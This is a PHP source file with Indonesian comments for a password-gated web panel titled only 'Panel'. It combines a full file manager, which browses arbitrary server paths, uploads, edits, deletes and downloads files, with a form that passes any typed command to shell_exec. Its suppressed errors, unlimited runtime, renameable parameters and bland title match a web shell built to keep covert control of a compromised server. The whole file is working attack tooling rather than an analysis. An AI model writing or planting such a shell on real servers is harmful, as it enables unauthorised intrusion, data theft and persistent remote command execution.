<?php
session_start();
error_reporting(0);
set_time_limit(0);

// ==================== KONFIGURASI RAHASIA ====================
$secret_password = 'gantiDenganPasswordKuat123!'; // Ganti dengan password Anda
$use_auth = true;
$param_name = 'act';        // Parameter untuk navigasi (bisa diganti)
$path_param = 'f';           // Parameter untuk path (bisa diganti)

// ==================== AUTENTIKASI SEDERHANA ====================
if ($use_auth) {
    if (!isset($_SESSION['logged'])) {
        if (isset($_POST['pass']) && $_POST['pass'] === $secret_password) {
            $_SESSION['logged'] = true;
        } else {
            echo '<form method="post">Password: <input type="password" name="pass"><input type="submit" value="Login"></form>';
            exit;
        }
    }
}

// ==================== FUNGSI BANTU ====================
function flash($msg, $type = 'info', $redirect = null) {
    $_SESSION['flash'] = ['msg' => $msg, 'type' => $type];
    if ($redirect) {
        header("Location: $redirect");
        exit;
    }
}

function showFlash() {
    if (isset($_SESSION['flash'])) {
        $f = $_SESSION['flash'];
        echo "<div style='background:#" . ($f['type']=='error'?'f88':'8f8') . ";padding:5px;margin:5px;'>{$f['msg']}</div>";
        unset($_SESSION['flash']);
    }
}

function formatBytes($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $bytes >= 1024 && $i < 4; $i++) $bytes /= 1024;
    return round($bytes, 2) . ' ' . $units[$i];
}

// ==================== PROSES ====================
// Ambil path saat ini (aman dari path traversal)
$current = isset($_GET[$path_param]) ? realpath($_GET[$path_param]) : getcwd();
if (!$current || !is_dir($current)) $current = getcwd();
chdir($current);

// Build query string untuk link (agar path tetap tersimpan)
function selfUrl($extra = '') {
    global $param_name, $path_param, $current;
    $url = '?' . $param_name . '=' . urlencode($_GET[$param_name] ?? '') . '&' . $path_param . '=' . urlencode($current);
    if ($extra) $url .= '&' . $extra;
    return $url;
}

// Handle aksi
$action = $_GET[$param_name] ?? 'list';

// ==================== ACTION HANDLER ====================
// Buat folder
if (isset($_POST['new_folder'])) {
    $name = trim($_POST['new_folder']);
    if ($name && mkdir($name)) flash("Folder '$name' dibuat", 'success', selfUrl());
    else flash("Gagal buat folder", 'error', selfUrl());
}

// Buat file
if (isset($_POST['new_file'])) {
    $name = trim($_POST['new_file']);
    $content = $_POST['content'] ?? '';
    if ($name && file_put_contents($name, $content) !== false) flash("File '$name' dibuat", 'success', selfUrl());
    else flash("Gagal buat file", 'error', selfUrl());
}

// Hapus
if (isset($_GET['del'])) {
    $target = basename($_GET['del']); // hindari traversal
    $full = $current . '/' . $target;
    if (is_file($full) && unlink($full)) flash("File '$target' dihapus", 'success', selfUrl());
    elseif (is_dir($full) && rmdir($full)) flash("Folder '$target' dihapus", 'success', selfUrl());
    else flash("Gagal hapus '$target'", 'error', selfUrl());
}

// Rename
if (isset($_POST['rename_old'], $_POST['rename_new'])) {
    $old = basename($_POST['rename_old']);
    $new = basename($_POST['rename_new']);
    if ($old && $new && rename($current.'/'.$old, $current.'/'.$new)) flash("Berhasil rename", 'success', selfUrl());
    else flash("Gagal rename", 'error', selfUrl());
}

// Simpan edit
if (isset($_POST['save_file'])) {
    $file = basename($_POST['save_file']);
    $content = $_POST['file_content'];
    if (file_put_contents($current.'/'.$file, $content) !== false) flash("File '$file' disimpan", 'success', selfUrl('edit='.urlencode($file)));
    else flash("Gagal simpan", 'error', selfUrl('edit='.urlencode($file)));
}

// Upload (dengan pengecekan error)
if (isset($_FILES['upload'])) {
    $success = 0; $errors = [];
    foreach ($_FILES['upload']['name'] as $i => $name) {
        if ($_FILES['upload']['error'][$i] !== UPLOAD_ERR_OK) {
            $errors[] = "$name: error " . $_FILES['upload']['error'][$i];
            continue;
        }
        $dest = $current . '/' . basename($name);
        if (move_uploaded_file($_FILES['upload']['tmp_name'][$i], $dest)) $success++;
        else $errors[] = "$name: gagal pindah";
    }
    $msg = "$success file berhasil upload.";
    if ($errors) $msg .= " Error: " . implode(', ', $errors);
    flash($msg, $errors ? 'error' : 'success', selfUrl());
}

// Command execution
$cmdResult = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (function_exists('shell_exec')) $cmdResult = shell_exec($cmd . ' 2>&1');
    else $cmdResult = "shell_exec tidak tersedia";
}

// Download
if (isset($_GET['download'])) {
    $file = $current . '/' . basename($_GET['download']);
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ==================== TAMPILAN HTML ====================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Panel</title>
    <style>
        body { background: #111; color: #ddd; font-family: monospace; }
        a { color: #8cf; text-decoration: none; }
        table { border-collapse: collapse; width:100%; }
        td, th { border:1px solid #333; padding:5px; }
        input, textarea, select { background:#222; color:#ddd; border:1px solid #555; padding:5px; }
        .btn { background:#333; color:#fff; padding:5px 10px; border:1px solid #777; cursor:pointer; }
        .btn:hover { background:#444; }
        .breadcrumb { background:#222; padding:5px; margin:5px 0; }
    </style>
</head>
<body>
<div style="max-width:1200px; margin:auto;">
    <h2>Panel</h2>
    <?php showFlash(); ?>

    <!-- Breadcrumb -->
    <div class="breadcrumb">
        <?php
        $parts = explode('/', $current);
        $path = '';
        foreach ($parts as $part) {
            if ($part == '') continue;
            $path .= '/' . $part;
            echo '<a href="?' . $param_name . '=' . urlencode($action) . '&' . $path_param . '=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a> / ';
        }
        ?>
    </div>

    <!-- Toolbar -->
    <div style="margin:10px 0;">
        <form method="post" style="display:inline;" enctype="multipart/form-data">
            <input type="file" name="upload[]" multiple>
            <button type="submit" class="btn">Upload</button>
        </form>
        <form method="post" style="display:inline;">
            <input type="text" name="new_folder" placeholder="Folder baru">
            <button type="submit" class="btn">Buat Folder</button>
        </form>
        <form method="post" style="display:inline;">
            <input type="text" name="new_file" placeholder="File baru">
            <button type="button" onclick="this.nextElementSibling.style.display='block'">Buat File</button>
            <div style="display:none; margin-top:5px;">
                <textarea name="content" rows="5" cols="50" placeholder="Isi file"></textarea>
                <button type="submit" class="btn">Simpan</button>
            </div>
        </form>
    </div>

    <!-- Command -->
    <div style="margin:10px 0; background:#222; padding:10px;">
        <form method="post">
            <input type="text" name="cmd" style="width:60%;" placeholder="perintah shell">
            <button type="submit" class="btn">Jalankan</button>
        </form>
        <?php if ($cmdResult !== ''): ?>
            <pre style="background:#000; color:#0f0; padding:5px; overflow:auto;"><?= htmlspecialchars($cmdResult) ?></pre>
        <?php endif; ?>
    </div>

    <!-- Daftar file -->
    <table>
        <tr><th>Nama</th><th>Ukuran</th><th>Aksi</th></tr>
        <?php
        $items = scandir($current);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full = $current . '/' . $item;
            $isDir = is_dir($full);
            $size = $isDir ? '-' : formatBytes(filesize($full));
            echo '<tr>';
            echo '<td><a href="?' . $param_name . '=' . urlencode($action) . '&' . $path_param . '=' . urlencode($full) . '">' . ($isDir?'📁':'📄') . ' ' . htmlspecialchars($item) . '</a></td>';
            echo '<td>' . $size . '</td>';
            echo '<td>';
            if (!$isDir) {
                echo '<a href="?' . $param_name . '=edit&' . $path_param . '=' . urlencode($current) . '&file=' . urlencode($item) . '">Edit</a> | ';
                echo '<a href="?' . $param_name . '=download&' . $path_param . '=' . urlencode($current) . '&download=' . urlencode($item) . '">Download</a> | ';
            }
            echo '<a href="?' . $param_name . '=rename&' . $path_param . '=' . urlencode($current) . '&file=' . urlencode($item) . '">Rename</a> | ';
            echo '<a href="?' . $param_name . '=delete&' . $path_param . '=' . urlencode($current) . '&del=' . urlencode($item) . '" onclick="return confirm(\'Hapus?\')">Hapus</a>';
            echo '</td>';
            echo '</tr>';
        }
        ?>
    </table>

    <!-- Form Edit / Rename -->
    <?php if ($action == 'edit' && isset($_GET['file'])): 
        $file = basename($_GET['file']);
        $content = file_get_contents($current . '/' . $file);
    ?>
        <h3>Edit <?= htmlspecialchars($file) ?></h3>
        <form method="post">
            <input type="hidden" name="save_file" value="<?= htmlspecialchars($file) ?>">
            <textarea name="file_content" rows="20" style="width:100%;"><?= htmlspecialchars($content) ?></textarea>
            <button type="submit" class="btn">Simpan</button>
        </form>
    <?php elseif ($action == 'rename' && isset($_GET['file'])): 
        $old = basename($_GET['file']);
    ?>
        <h3>Rename <?= htmlspecialchars($old) ?></h3>
        <form method="post">
            <input type="hidden" name="rename_old" value="<?= htmlspecialchars($old) ?>">
            <input type="text" name="rename_new" value="<?= htmlspecialchars($old) ?>" size="50">
            <button type="submit" class="btn">Rename</button>
        </form>
    <?php endif; ?>
</div>
</body>
</html>